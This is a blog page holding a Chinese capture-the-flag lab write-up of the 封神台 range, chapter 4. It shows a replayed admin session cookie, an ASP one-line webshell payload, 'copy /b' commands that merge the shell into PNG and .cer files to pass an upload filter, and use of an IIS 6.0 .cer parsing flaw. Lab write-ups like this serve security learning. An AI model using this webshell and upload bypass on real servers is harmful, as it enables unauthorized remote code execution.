@@ -1,0 +1,86 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>封神台打靶随记 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>封神台打靶随记</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-09T04:19:12.000Z" id="date"> 2023-09-09</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-09T05:32:01.770Z" id="updated"> 2023-09-09</time></div></span></div></div><hr><div id="post-content"><p>这篇文章记录掌控安全的封神台打靶记录</p>
+<span id="more"></span>
+
+<p>前面的两个sql注入和一个存储型xss get cookie就不记录了，非常简单我们从第四章开始</p>
+<h1 id="第四章：进击！拿到Web最高权限！"><a href="#第四章：进击！拿到Web最高权限！" class="headerlink" title="第四章：进击！拿到Web最高权限！"></a>第四章：进击！拿到Web最高权限！</h1><p>看题目描述应该是一个xss配合文件上传，直接访问靶场，如下所示：</p>
+<p class='item-img' data-src='/1.png'><img src="/1.png"></p>
+<p>点击超链接并抓包：</p>
+<p class='item-img' data-src='/2.png'><img src="/2.png"></p>
+<p>存在cookie字段，替换为上一题所获取的admin的cookie：</p>
+<p><code>ADMINSESSIONIDCSTRCSDQ=LBMLMBCCNPFINOANFGLPCFBC</code></p>
+<p>替换普通cookie后登录成功，是一个后台</p>
+<p class='item-img' data-src='/3.png'><img src="/3.png"></p>
+<p>然后点点点，发现有很多文件上传的点，点开下载中心-添加下载程序-产品图片栏</p>
+<p>可以上传文件，上传一个正常的png</p>
+<p class='item-img' data-src='/4.png'><img src="/4.png"></p>
+<p>可以正常访问，上传一个webshell试试？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;%eval request(&quot;pass&quot;)%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>结果弹了一个框告诉我有后端白名单限制</p>
+<p>但是有时候前端的alert并没有什么用处，我们还是可以尝试访问一下webshell——-失败</p>
+<p>或者说存在waf删检测到了文件内容？那可以尝试一下上传图片格式的webshell——-成功，证明没有waf，但是有一个白名单限制</p>
+<p>再经过n次的测试发现，前端会检测文件内容，是否是一个合格的image，因此我们使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">copy /b 正常.png+shell.asp out.png<br></code></pre></td></tr></table></figure>
+
+<p>才可以正常上传，否则无法抓包使用</p>
+<hr>
+<p>似乎遇到了瓶颈，我们使用工具简单对这个站信息收集一下</p>
+<p class='item-img' data-src='/5.png'><img src="/5.png"></p>
+<p>我们获取到了他的中间件以及版本，然后搜索一下这个中间件版本的漏洞！</p>
+<p>首先找到了一个后缀名的解析漏洞，但是测试失败了，我的操作应该没问题</p>
+<p class='item-img' data-src='/6.png'><img src="/6.png"></p>
+<hr>
+<p>似乎又是被卡住了？静下心想到了刚才的白名单，出现了不是image图像的Content-type文件格式后缀———-cer</p>
+<p>这是证书的后缀，出现在这里似乎有点奇怪，搜索一下</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73720136/article/details/130537815">IIS6.0文件解析漏洞–特殊符号“&#x2F;“ &amp;&amp; IIS6.0文件解析漏洞–特殊符号“；“<em>iis6解析漏洞利用</em></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">IIS除了可以解析.asp后缀的脚本以外，还可以解析.cer和.asa后缀的文件<br></code></pre></td></tr></table></figure>
+
+<p>发现新大陆！上传cer木马！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">copy /b 正常.cer+asp_shell.asp aspshell.cer<br></code></pre></td></tr></table></figure>
+
+<p>成功上传！浏览器也成功访问到了！然后蚁剑连接</p>
+<p class='item-img' data-src='/7.png'><img src="/7.png"></p>
+<p>getshell后查找flag提交</p>
+<p>结束</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/09/vulhub-CVE-2021-43008/">vulhub_CVE-2021-43008 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0%EF%BC%9A%E8%BF%9B%E5%87%BB%EF%BC%81%E6%8B%BF%E5%88%B0Web%E6%9C%80%E9%AB%98%E6%9D%83%E9%99%90%EF%BC%81"><span class="toc-number">1.</span> <span class="toc-text">第四章：进击！拿到Web最高权限！</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: '此条评论委托企鹅物流发送'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
